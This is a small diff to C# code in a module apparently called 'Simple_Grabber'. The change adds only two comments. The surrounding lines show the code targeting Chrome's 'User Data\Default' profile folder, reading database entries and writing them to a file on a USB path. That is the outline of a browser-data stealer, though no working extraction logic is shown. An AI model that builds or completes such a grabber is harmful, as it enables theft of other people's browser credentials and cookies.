@@ -23,6 +23,8 @@ namespace Simple_Grabber.Modules
 
         public static string FolderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default";
         
+        // Get the entries within the database
+
         private static StringBuilder GetDatabaseEntries()
         {
             var databaseEntries = new StringBuilder();
@@ -71,6 +73,8 @@ namespace Simple_Grabber.Modules
 
             return databaseEntries;
         }
+
+        // Write the entries to a file
 
         public static void WriteToFile(string USBPath)
         {
